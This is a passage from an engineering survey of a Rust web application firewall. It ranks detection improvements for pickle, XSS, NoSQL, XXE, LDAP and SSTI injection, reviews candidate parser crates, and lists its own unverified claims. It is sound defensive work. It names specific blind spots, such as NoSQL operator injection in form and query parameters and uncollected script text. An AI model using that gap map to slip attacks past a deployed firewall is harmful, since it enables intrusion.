   3.8 — emits `STACK_GLOBAL` instead. ~200 lines, no dependency, flat and
   non-recursive, executes
   nothing. Best ratio in the survey by a wide margin.
2. **XSS — collect `<script>` text into `js_contexts`.** Not a parser change at
   all; it is the missing few lines that keep four corpus rows, three of them
   carrying `document.cookie`, permanently below the Block threshold. Zero new
   surface. Ranked second only because it fixes enforcement, not detection.
3. **NoSQL — surface form and query parameters as leaves.** The operator rules
   are anchored to a whole leaf, form bodies produce no leaves, and a query
   string is one field, so every operator injection outside a JSON/XML/GraphQL
   body is unreachable no matter which rules are on. Extractor work, not detector
   work; it also makes the already-written default-off rules effective on the day
   they are calibrated.
4. **Everything else — rule scoping and rule rows, not parsers.** Two XXE rules
   and two traversal rules to bring on-by-default under route scope; an XInclude
   row; five SSTI engine signatures; `\xNN` decoding in the shared preprocessor.
   All of it code, because there is no per-rule config surface — see above.

Nothing above requires a new parser dependency. That is the survey's conclusion,
not an accident of ordering.

A fifth item belongs on the list but is not this document's to make: **give
`default_on` a configuration surface.** Fifteen of the forty blind rows are
rules that already exist and are compiled out, and today no one can price
switching one on without editing Rust and cutting a release. Every "default-off"
consolation in this survey is worth less than it looks until that changes.

## Appendix — candidate crate diligence

Every crate named anywhere above, checked on the axes `deny.toml` actually gates.
Versions and dates from the crates.io API; trees from a scratch project resolved
against the live index; advisories from `cargo audit` with a freshly fetched
RustSec database (1173 advisories loaded); licences checked against
`[licenses] allow` in `deny.toml`.

| crate | latest | released | maintained | RUSTSEC | licence | transitive | C toolchain |
|---|---|---|---|---|---|---|---|
| `typed-path` | 0.12.3 | 2026-02-11 | yes | none | MIT OR Apache-2.0 | **0** | no |
| `serde-pickle` | 1.2.0 | 2024-11-22 | yes | none | MIT/Apache-2.0 | 7 | no |
| `sxd-xpath` | 0.4.2 | **2018-10-31** | **no — 7.5 y** | none | MIT/Apache-2.0 | 4 | no |
| `oxc_parser` | 0.142.0 | 2026-07-27 | very active | none | MIT | 76 | no |
| `swc_ecma_parser` | 43.0.0 | 2026-07-29 | very active | none | Apache-2.0 | 116 | **yes** (`stacker`→`psm`→`cc`) |
| `boa_parser` | 0.21.1 | 2026-03-29 | active | RUSTSEC-2024-0436 (`paste`, transitive, unmaintained) | Unlicense OR MIT | 75 | no |
| `ressa` | 0.9.0-alpha.3 | 2023-06-11 | stale | 4× unmaintained (`unic-*`) | MIT | 24 | no |
| `rslint_parser` | 0.3.1 | 2021-10-06 | **dead** (superseded by Biome) | RUSTSEC-2023-0055, RUSTSEC-2023-0086 (both unsound), RUSTSEC-2021-0145 (`atty`) | MIT | 41 | no |
| `roxmltree` | 0.21.1 | 2025-10-12 | yes | none | MIT OR Apache-2.0 | — | no |
| `quick-xml` | 0.41.0 | 2026-06-29 | yes | none (0.41 fixes RUSTSEC-2026-0194/0195) | MIT | — | no — **already in the tree** |
| `minijinja` | 2.21.0 | 2026-06-17 | very active | none | Apache-2.0 | — | no |
| `handlebars` | 6.4.3 | 2026-07-12 | very active | none | MIT | — | no |
| `jaded` | 0.5.0 | 2024-10-01 | yes | none | MIT | — | no |
| `ldap3` | 0.12.1 | 2025-09-18 | yes | none | MIT/Apache-2.0 | — | no |
| `ldap-types` | — | — | yes | none | — | — | no |
| `askama_parser` | 0.16.0 | 2026-04-29 | very active | none | MIT OR Apache-2.0 | — | no |
| `ldap` (meta-crate) | — | **2017** | **dead** | **18 unmaintained + 1 unsound** (tokio-0.1 stack) | — | — | — |

Notes that changed a conclusion:

* **`ldap-filter` does not exist on crates.io** (404, checked twice), but the
  stronger claim in this document's first draft — that *no* crate parses an RFC
  4515 filter string — was wrong. Two do:
  `ldap3::parse_filter` (nom-based; marked `#[doc(hidden)]` but genuinely
  `pub use`d from the crate root) and `ldap-types::filter::search_filter_parser`
  (chumsky-based, ordinary public API, exposes an `LDAPSearchFilter` AST).
  **Neither offers a depth limit.** `rasn-ldap` is not a candidate — it handles
  the ASN.1/BER *wire* encoding, a different language from the textual filter
  syntax. The `ldap` meta-crate advertising an `ldap_rfc4515` module is a hard
  no: last release 2017, dragging in the dead tokio-0.1 stack (18 unmaintained
  advisories plus one genuine unsoundness).
  This does not change the LDAP verdict, which rests on the measured false-positive
  increase and not on availability — but the verdict is "the measurement says no",
  not "there was nothing to use".
* **`unicode-ident` reports `(MIT OR Apache-2.0) AND Unicode-3.0`.** All three
  are on the allowlist, so it passes; a naive SPDX splitter flags it, and it is
  already in this tree via `syn` regardless.
* **`swc_ecma_parser` is the only C dependency in the survey**, and it arrives
  through `stacker`/`psm` — the exact pair `crates/waf-engine/Cargo.toml:36`
  deliberately dropped by taking `sqlparser` with `default-features = false`.

* **Depth limits are near-universally absent.** Of everything examined, exactly
  one candidate ships one: `askama_parser` (`MAX_DEPTH = 128`, plus a dedicated
  parser fuzz target) — and it is in the group this survey rejects on other
  grounds. `serde-pickle`, `sxd-xpath`, `ldap3::parse_filter`, `ldap-types`,
  `oxc_parser`, `boa_parser`, `ressa` and `rslint_parser` all recurse without a
  configurable bound. Any adoption would carry a pre-parse guard written by us,
  as `ast_structural_depth_ok` already is for `sqlparser`. `typed-path` is the
  exception that proves the point: it has no syntactic recursion at all, folding
  path components lexically.
* **The XML candidates are all XXE-safe.** `quick-xml` 0.41 (the version already
  pinned here), `roxmltree` and `xml` 1.3.0 each decline to fetch an external
  `SYSTEM` URI. This is a point in favour of the existing design rather than a
  reason to change it: the safety comes from *not resolving entities*, which is
  precisely what the current parser-free XXE detector achieves without a parser.
* **`tera` split between major versions.** 1.x exposed a public AST; the 2.x that
  `cargo add tera` resolves to today made parsing private. Any survey of template
  parsers that predates that split is stale.

Unverified, and stated as such: `ldap-types`' exact version, release date and
licence were not confirmed; upstream `fuzz/` directories were not surveyed for
any candidate except `askama_parser`; no compile-time or binary-size measurement
was taken for any crate. Since the recommendation adds no dependency, none of
this was pursued further — but nothing above should be quoted as diligence
sufficient to *adopt* a crate, only as sufficient to decline one.

## What this survey did not settle

* **The corpus is 390 rows.** Every "currently missed" claim is anchored to a real
  committed row, but 15 rows per family cannot establish a false-positive rate.
  The corpus's own README says the same about `rollout_bps`.
* **The default-on rule tables were re-implemented in Python** to identify the
  blind rows the baseline only counts. It reproduces the recorded per-family
  numbers exactly except for SSTI, where it says 6 and the baseline says 5; that
  one row is `ssti-011`, accounted for above (an uncurated header). The
  decode-chain model is an approximation: form-parameter splitting, JSON leaf
  extraction and blind base64 are modelled; multipart, GraphQL, hex and
  `lower_trunc` token truncation are not, and the model splits form parameters
  the real preprocessor does not — so it is optimistic about what the engine
  sees, which biases the "currently missed" list towards being too *short*.
* **No CPU numbers were measured.** The cost column is reasoned from parser shape
  (flat opcode walk vs recursive descent) and from the prefilter/budget machinery
  the tree already applies, not from a benchmark. `tests/perf/` was deliberately
  not run.
* **`ldap-009` regression.** The RFC 4515 prototype loses the hex-escape row. A
  production parser would decode RFC 4515 escapes before parsing and might keep
  it, which would make the prototype's 13/15 a 14/15. That was not built, so the
  measured comparison is the pessimistic one for the parser.
* **PHP `serialize()` was not prototyped.** The claim that a format parser reduces
  false positives and reaches nested objects (`deser-015`) is reasoned from the
  format's grammar, not measured.
* **`xxe-005` is asserted, not run.** `RuleKind::Count(3)` should fire on a
  payload declaring three entities; the counting semantics (per view? per
  request?) were read, not exercised.
* **Three claims in this document's own first draft were wrong**, and each was
  caught by going and checking rather than by reasoning harder: that
  `serde-pickle` resolves globals into callables (it does not — it whitelists
  seven and discards the rest); that no crate parses an RFC 4515 filter string
  (two do); and that `sxd-xpath`'s parser could not be used without an XML
  document (`Factory::build` does exactly that). A fourth, the pickle protocol
  boundary, was off by two protocol versions. The pattern is consistent enough to
  be worth naming: **every error was an availability or capability claim made
  from memory, and every measured claim held.** Treat the unmeasured assertions
  that remain — the PHP `serialize()` reasoning, the CPU column — with the
  matching suspicion.
